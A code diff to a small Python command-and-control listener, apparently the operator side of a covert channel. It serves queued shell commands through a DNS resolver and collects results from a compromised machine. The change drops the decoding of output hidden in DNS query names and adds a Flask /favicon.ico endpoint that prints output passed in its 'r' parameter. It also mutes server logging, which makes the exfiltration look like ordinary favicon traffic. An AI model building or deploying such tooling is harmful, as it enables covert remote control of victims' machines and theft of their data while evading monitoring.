@@ -1,13 +1,24 @@
 # Based on https://github.com/paulc/dnslib/blob/master/dnslib/fixedresolver.py
 import copy
+import logging
 import queue
 import threading
 import time
 
 import dnslib.server
+import flask
 
 
 cmds = queue.Queue()
+app = flask.Flask(__name__)
+
+
+@app.route('/favicon.ico')
+def hello_world():
+    response = flask.request.args.get('r')
+    if response:
+        print(f'\n\n--\n\n{response}\n\n--\n\ncmd: ', end = '')
+    return ''
 
 
 def encode(cmd):
@@ -26,12 +37,6 @@ def collect_commands():
 class Resolver(dnslib.server.BaseResolver):
 
     def resolve(self, request, handler):
-
-        name = str(request.q.qname)
-        if name.startswith('A?'):
-            response = name[2:-1].replace('%', ' ')
-            print(f'\n\n--\n\n{response}\n\n--\n\ncmd: ', end = '')
-
         zone = ''
         try:
             cmd = cmds.get_nowait()
@@ -64,8 +69,9 @@ def main():
 
     udp_server.start_thread()
 
-    while udp_server.isAlive():
-        time.sleep(1)
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)
+    app.run()
 
 
 if __name__ == '__main__':
